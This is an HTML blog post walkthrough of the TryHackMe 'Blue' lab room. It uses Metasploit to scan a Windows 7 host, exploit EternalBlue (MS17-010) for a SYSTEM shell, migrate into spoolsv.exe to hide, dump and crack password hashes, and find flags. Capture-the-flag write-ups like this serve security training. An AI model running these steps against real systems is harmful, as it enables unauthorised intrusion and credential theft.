@@ -1,0 +1,195 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr">
+  <head>
+    <meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>TryHackMe - Blue | Blog</title>
+<meta name="description" content="Deploy &amp; hack into a Windows machine, leveraging common misconfigurations issues." />
+<link rel="alternate" href="https://example.com/" hreflang="x-default" />
+
+<link rel="canonical" href="https://joshuachp.dev/posts/2020-09-03_tryhackme_blue/" />
+<link rel="preconnect" href="https://joshuachp.dev/" />
+<link href="/pagefind/pagefind-component-ui.css" rel="stylesheet" />
+<script src="/pagefind/pagefind-component-ui.js" type="module"></script>
+  <script
+    data-goatcounter="https://a7d98e3f-b56b.goatcounter.com/count"
+    async
+    src="//gc.zgo.at/count.js"></script>
+  <noscript>
+    <img
+      src="https://a7d98e3f-b56b.goatcounter.com/count?p=" />
+  </noscript>
+
+        <link rel="preload" href="/css/main.2b8ec40bf2c2d4bc3396f47e0628957af04259b89bd4bebcfea59c3a7f3b4f16.css" as="style" />
+        <link
+          rel="stylesheet"
+          href="/css/main.2b8ec40bf2c2d4bc3396f47e0628957af04259b89bd4bebcfea59c3a7f3b4f16.css"
+          type="text/css"
+          integrity="sha256-K47EC/LC1LwzlvR&#43;BiiVevBCWbib1L68/qWcOn87TxY="
+          crossorigin="anonymous" />
+
+
+      <link
+        rel="preload"
+        href="/font/AtkinsonHyperlegibleNext-VariableFont_wght.d9f388a29cb20d8ec6ab264f41586e56e6259e4bba4e1a6aeaff473c94a5c769.woff2"
+        as="font"
+        type="font/woff2"
+        integrity="sha256-2fOIopyyDY7GqyZPQVhuVuYlnku6Thpq6v9HPJSlx2k="
+        crossorigin="anonymous" />
+<style>
+  @font-face {
+    font-family: "Atkinson Hyperlegible Next";
+    font-style: normal;
+    font-weight: 200 800;
+    font-display: swap;
+    src: url("/font/AtkinsonHyperlegibleNext-VariableFont_wght.woff2") format("woff2");
+  }
+  @font-face {
+    font-family: "Atkinson Hyperlegible Next";
+    font-style: italic;
+    font-weight: 200 800;
+    font-display: swap;
+    src: url("/font/AtkinsonHyperlegibleNext-Italic-VariableFont_wght.woff2") format("woff2");
+  }
+</style>
+
+
+        <link rel="modulepreload" href="/js/main.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.js" />
+        <script
+          type="module"
+          src="/js/main.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.js"
+          integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="
+          crossorigin="anonymous"></script>
+
+
+  </head>
+  <body>
+    <header>
+      
+  <nav>
+    <ul>
+    <li>
+      <a href="/">Home</a>
+    </li>
+    <li>
+      <a aria-current="true" class="ancestor" href="/posts/">Posts</a>
+    </li>
+    <li>
+      <a href="/tags/">Tags</a>
+    </li>
+    </ul>
+  </nav>
+
+<pagefind-modal-trigger></pagefind-modal-trigger>
+<pagefind-modal></pagefind-modal>
+
+    </header>
+    <main>
+      
+    <h1 id="tryhackme---blue">TryHackMe - Blue</h1>
+<blockquote>
+<p>The room link can be found at <a href="https://tryhackme.com/room/blue">TryHackMe - Blue</a></p>
+</blockquote>
+<p>For this room, I will be using the Metasploit framework.</p>
+<h2 id="recon">Recon</h2>
+<p>We begin with a Nmap of the box to see the services and get their version.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf5 &gt; db_nmap -sC -sV 10.10.47.219
+</span></span></code></pre></div><p>Now we can see all the running services with the <code>services</code> command.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf5 &gt; services
+</span></span><span style="display:flex;"><span>Services
+</span></span><span style="display:flex;"><span><span style="color:#f92672">========</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>host           port   proto  name               state  info
+</span></span><span style="display:flex;"><span>----           ----   -----  ----               -----  ----
+</span></span><span style="display:flex;"><span>10.10.47.219   <span style="color:#ae81ff">135</span>    tcp    msrpc              open   Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>10.10.47.219   <span style="color:#ae81ff">139</span>    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>10.10.47.219   <span style="color:#ae81ff">445</span>    tcp    microsoft-ds       open   Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> microsoft-ds workgroup: WORKGROUP
+</span></span><span style="display:flex;"><span>10.10.47.219   <span style="color:#ae81ff">3389</span>   tcp    ssl/ms-wbt-server  open
+</span></span><span style="display:flex;"><span>10.10.47.219   <span style="color:#ae81ff">49152</span>  tcp    msrpc              open   Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>10.10.47.219   <span style="color:#ae81ff">49153</span>  tcp    msrpc              open   Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>10.10.47.219   <span style="color:#ae81ff">49154</span>  tcp    msrpc              open   Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>10.10.47.219   <span style="color:#ae81ff">49158</span>  tcp    msrpc              open   Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>10.10.47.219   <span style="color:#ae81ff">49160</span>  tcp    msrpc              open   Microsoft Windows RPC
+</span></span></code></pre></div><p>On this machine, we will focus on the <strong>SMB</strong> service which is on port <code>445</code>.</p>
+<p>We can gather more information using the module <code>auxiliary/scanner/smb/smb_version</code>. Running it the
+services page will lock more like this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>10.10.47.219  <span style="color:#ae81ff">445</span>    tcp    smb                open   Windows <span style="color:#ae81ff">7</span> Professional SP1 <span style="color:#f92672">(</span>build:7601<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>name:JON-PC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>workgroup:WORKGROUP <span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signatures:optional<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Also we run <code>auxiliary/scanner/smb/smb1</code> to check if the box has support for SMBv1.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf5 auxiliary<span style="color:#f92672">(</span>scanner/smb/smb1<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.47.219:445      - 10.10.47.219 supports SMBv1 dialect.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.47.219:445      - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>100% complete<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Auxiliary module execution completed
+</span></span></code></pre></div><p>As the machine name implies the box could be exploitable via <strong>EternalBlue</strong>. Since the machine has
+<strong>Windows 7</strong> installed and <strong>SMBv1</strong> enabled, it is most likely vulnerable. You can read more here
+<a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010">Microsoft - EternalBlue</a>.</p>
+<p>We can check if the machine is vulnerable by running the module
+<code>auxiliary/scanner/smb/smb_ms17_010</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf5 auxiliary<span style="color:#f92672">(</span>scanner/smb/smb_ms17_010<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 10.10.47.219:445      - Host is likely VULNERABLE to MS17-010! - Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> x64 <span style="color:#f92672">(</span>64-bit<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.10.47.219:445      - Scanned <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>100% complete<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Auxiliary module execution completed
+</span></span></code></pre></div><h2 id="gain-access">Gain Access</h2>
+<p>Now we search for an exploit we can use in Metasploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf5 &gt; search ms17_010
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#  Name                                           Disclosure Date  Rank     Check  Description</span>
+</span></span><span style="display:flex;"><span>   -  ----                                           ---------------  ----     -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption <span style="color:#66d9ef">for</span> Win8+
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+</span></span></code></pre></div><p>Select it using <code>use 2</code>, set <code>LHOST</code> and <code>RHOST</code>, and run it. The exploit could fail multiple times.
+But if you continue trying it will succeed. You could also try setting the payload to
+<code>generic/shell_reverce_tcp</code>.</p>
+<p>Now we have a meterpreter session on the box.</p>
+<h2 id="escalate">Escalate</h2>
+<p>If you have a simple shell you can use the <code>post/multi/manage/shell_to_meterpreter</code> module to
+upgrade your shell.</p>
+<p>If you have a meterpreter shell you can check who you are with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span></code></pre></div><p>Since we are <strong>NT AUTHORITY\SYSTEM</strong> we have full administrator access to the box. With this
+privilege, we can migrate our process to <code>spoolsv.exe</code> to hide our process. We can use <code>ps</code> and
+<code>migrate</code> command for this. Alternatively, we can use <code>run post/windows/manage/migrate</code> to spawn a
+<em>notepad</em> process and migrate to it.</p>
+<h2 id="cracking">Cracking</h2>
+<p>To crack the passwords first we need to dump them. There are two ways to do this, we can use the
+<code>hashdump</code> command and crack them outside of Metasploit. Else we can run the post module
+<code>use post/windows/gather/hashdump</code> this will save the hashes in the database. Then we run
+<code>use auxiliary/analyze/crack_windows</code> to crack them with <strong>john</strong>. The challenge suggests us to use
+the wordlist <strong>rockyou.txt</strong>.</p>
+<h2 id="find-flags">Find flags</h2>
+<p>To find the flag you can use the <code>search</code> command with the file name from the root directory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; search -f flag*
+</span></span></code></pre></div>
+  
+  <div>
+    <div>Tags:</div>
+    <ul>
+        <li><a href="/tags/ctf/">CTF</a></li>
+        <li><a href="/tags/thm/">THM</a></li>
+    </ul>
+  </div>
+
+
+    </main>
+    <footer>
+      <p>Copyright 2026. All rights reserved.</p>
+<div class="link">
+    <a href="https://hachyderm.io/@joshuachp" rel="me" id="mastodon" target="_blank" class="icon"><svg width="74" height="79" viewBox="0 0 74 79" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M73.7014 17.9592C72.5616 9.62034 65.1774 3.04876 56.424 1.77536 54.9472 1.56019 49.3517.7771 36.3901.7771H36.2933c-12.9652.0-15.7468.78309-17.2236.99826C10.56 3.01348 2.78877 8.91838.903306 17.356-.00357857 21.5113-.100361 26.1181.068112 30.3439.308275 36.404.354874 42.4535.91406 48.489c.38658 4.009 1.06096 7.9861 2.01809 11.9015 1.79226 7.2312 9.04735 13.249 16.15545 15.704C26.6979 78.6548 34.8821 79.0799 42.724 77.3221 43.5866 77.1245 44.4398 76.8953 45.2833 76.6342 47.1867 76.0381 49.4199 75.3714 51.0616 74.2003 51.0841 74.1839 51.1026 74.1627 51.1156 74.1382 51.1286 74.1138 51.1359 74.0868 51.1368 74.0592V68.2108C51.1364 68.185 51.1302 68.1596 51.1185 68.1365 51.1069 68.1134 51.0902 68.0932 51.0695 68.0773 51.0489 68.0614 51.0249 68.0503 50.9994 68.0447 50.9738 68.0391 50.9473 68.0392 50.9218 68.045c-5.0242 1.181-10.1727 1.773-15.3382 1.7637C26.694 69.8087 24.3031 65.6569 23.6184 63.9285 23.0681 62.4347 22.7186 60.8764 22.5789 59.2934 22.5775 59.2669 22.5825 59.2403 22.5934 59.216 22.6043 59.1916 22.621 59.1702 22.6419 59.1533 22.6629 59.1365 22.6876 59.1248 22.714 59.1191 22.7404 59.1134 22.7678 59.1139 22.794 59.1206 27.7345 60.2936 32.799 60.8856 37.8813 60.8843c1.2223.0 2.441.0 3.6634-.0317000000000007C46.6562 60.7115 52.0437 60.454 57.0728 59.4874 57.1983 59.4628 57.3237 59.4416 57.4313 59.4098c7.9325-1.4991 15.4815-6.2047 16.2486-18.1203C73.7086 40.8204 73.7803 36.3758 73.7803 35.889 73.7839 34.2347 74.3216 24.1533 73.7014 17.9592zM61.4925 47.6918H53.1514V27.5855c0-4.2329-1.7923-6.3917-5.4378-6.3917-4.0075.0-6.0148 2.5538-6.0148 7.5981V39.7974h-8.291V28.7919c0-5.0443-2.0109-7.5981-6.0184-7.5981-3.624.0-5.4342 2.1588-5.4378 6.3917V47.6918h-8.334V26.9752c0-4.2329 1.0981-7.5957 3.2942-10.0884 2.2654-2.4868 5.237-3.7637 8.9255-3.7637 4.2691.0 7.4952 1.6155 9.6459 4.8431L37.5587 21.3949l2.079-3.4287c2.1507-3.2276 5.3768-4.8431 9.6388-4.8431 3.6849.0 6.6564 1.2769 8.929 3.7637 2.1962 2.4904 3.2942 5.8532 3.2942 10.0884L61.4925 47.6918z" fill="inherit"/></svg>
+    </a>
+</div>
+
+    </footer>
+  </body>
+</html>
